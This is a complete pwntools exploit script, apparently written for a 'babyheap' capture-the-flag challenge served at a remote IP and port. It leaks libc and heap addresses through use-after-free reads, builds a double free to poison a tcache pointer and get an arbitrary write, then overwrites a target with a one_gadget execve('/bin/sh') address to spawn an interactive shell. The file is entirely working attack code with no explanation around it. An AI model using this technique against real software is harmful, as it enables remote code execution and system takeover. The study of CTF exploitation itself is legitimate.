#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyheap_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-linux-x86-64.so.2",checksec=False)

context.binary = exe

def GDB():
    gdb.attach(p,gdbscript='''
    b*0x401719
    c
    ''')
    input()
if args.REMOTE:
    p = remote("13.212.34.169", 31070)
else:
    p = process([exe.path])
    #GDB()

def add(index,len,name):
    p.sendlineafter(b"Enter your choice: ",b"1")
    p.sendlineafter(b"in the database: ",f"{index}".encode())
    p.sendlineafter(b"Length of that student's name: ",f"{len}".encode())
    p.sendlineafter(b"Enter the name: ",name)
def show(index):
    p.sendlineafter(b"Enter your choice: ",b"2")
    p.sendlineafter(b"Input student ID: ",f"{index}".encode())

def free(index):
    p.sendlineafter(b"Enter your choice: ",b"3")
    p.sendlineafter(b"Input student ID: ",f"{index}".encode())
add(0,0x4f8,b"0")
add(1,0x58,b"1")
free(0)
show(0)
leak = int.from_bytes(p.recv(6),"little")
log.info("[+]leak:"+hex(leak))
libc.address = leak - 0x219ce0
log.info("[+]LIBC BASE:"+hex(libc.address))

for i in range(7+3):
    add(i,0x58,f"{i}".encode())
free(0)
show(0)
heap =int.from_bytes(p.recv(2),"little")<<12
log.info("[+]Heap base:"+hex(heap))

for i in range(1,7):
    free(i)
free(7)
free(8)
free(7)

for i in range(11,11+7):
    add(i,0x58,f"{i}".encode())
payload = p64((heap >>12) ^ (0x4040a0))
add(18,0x58,payload)
add(19,0x58,b"junkchunks")

for i in range(0,7):
    add(i,0x28,f"{i}".encode())
add(0,0x58,b"HHHHH")

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
one= libc.address+0xebcf8
add(2,88,p64(one))

p.sendlineafter(b"Enter your choice: ",b"5")

p.interactive()

